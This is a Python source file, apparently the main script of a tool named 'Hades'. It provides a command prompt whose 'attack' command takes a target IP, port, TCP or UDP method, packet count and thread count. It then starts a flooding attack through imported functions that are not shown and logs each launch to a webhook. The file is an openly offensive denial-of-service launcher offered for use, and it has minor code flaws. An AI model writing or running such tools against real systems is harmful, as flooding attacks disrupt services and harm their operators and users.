# Hades is an advanced tools with multipurpose function.
# Created by InternalJava

# Import required libraries
from pystyle import *
from os import system as _sys
from src.attack.attack_func import *
from src.misc.logs.webhook_log import *

# Colors settings
_cyan = Colors.light_blue
_white = Colors.white
_reset = Colors.reset

# Methods
_methods = ["TCP", "UDP"]

# Command parsing and home functions
class Hades():
    def __init__(self):
        _sys("cls")
        _sys("title Hades [Version 2]")
        _sys("mode 75, 18")

    def graphics(self):
        file = open("assets/graphics.txt", "r", encoding="utf8")
        content = file.read()
        content.center(24, ' ')
        print(Colorate.Vertical(Colors.cyan_to_blue, content, 1))
        print(_reset + "Type 'help' to seek for help")
        file.close()

    def command_parser(self, command):
        if command == "help":
            print("""
            - help (Shows you list of commands)
            - methods (Display methods list)
            - attack (Starts attack mode)
            """)
        if command == "clear":
            _sys("cls")
            self.graphics()
        if command == "attack":
            ip = str(input(f"{_white}Target: {_cyan}"))
            port = int(input(f"{_white}Port: {_cyan}"))
            methods = str(input(f"{_white}Methods: {_cyan}"))
            packets = int(input(f"{_white}Packets: {_cyan}"))
            threads = int(input(f"{_white}Threads: {_cyan}"))
            sended = True
            if sended == True:
                if methods not in _methods:
                    print("Please enter a valid method.")
                    return
                else:
                    if methods == "TCP":
                        Attack._TCP(ip, port, packets)
                    if methods == "UDP":
                        Attack.UDP(ip, port, packets)
                    Log._sendWebhook("url", "Attack has been launched to: '{0}'".format(ip))
            else:
                print(f"{_reset}Failed to launch attack.")
    
    def run(self):
        self.graphics()
        while True:
            self.command_parser(input(f"{_cyan}hades{_white}@{_cyan}user{_white}~: {_cyan}"))

# Run all the functions written
if __name__ == "__main__":
    app = Hades()
    app.run()